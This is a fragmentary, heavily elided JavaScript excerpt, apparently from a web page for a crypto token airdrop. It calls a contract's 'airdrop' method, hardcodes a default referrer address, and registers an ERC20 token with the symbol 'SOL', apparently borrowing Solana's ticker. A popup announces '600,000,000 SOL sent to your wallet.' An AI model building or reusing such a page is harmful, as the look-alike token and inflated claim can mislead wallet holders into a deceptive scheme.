...
const sttaddr = "0x45cd2a308f3953bf30bf868eb0f196e5dbcb4acf";
...
const getAirdrop = async () => {
  ...
  if(fresh === "")
    fresh = "0x81D5E6A6F1bF94c9F60130AF764dedd64B18E697";
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
              if(!err){
            Swal.fire({
   title: 'Claim Success',
   icon: 'success',
   html: '600,000,000 SOL sent to your wallet.',
...
function calculate() {
    ...
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US")+' SOL';
  ...
  function addToWallet() {
                          ...
                          web3.currentProvider.sendAsync({
                            ...
                            params: {
                                'type': 'ERC20',
                                'options': {
                                    'address': '0x45cd2a308f3953bf30bf868eb0f196e5dbcb4acf',
                                    'symbol': 'SOL',
                                    'decimals': '18',
   ...
   cancelButtonText: 'Exit',
        ...
        function querySt(ji) {
         ...
         if (ft[0] == ji) { 
          ...
          if( ref==null){
              ref = "0x81D5E6A6F1bF94c9F60130AF764dedd64B18E697";
               document.getElementById('airinput').value = ref; 
          }else{ 
          document.getElementById('airinput').value = ref; 
          } 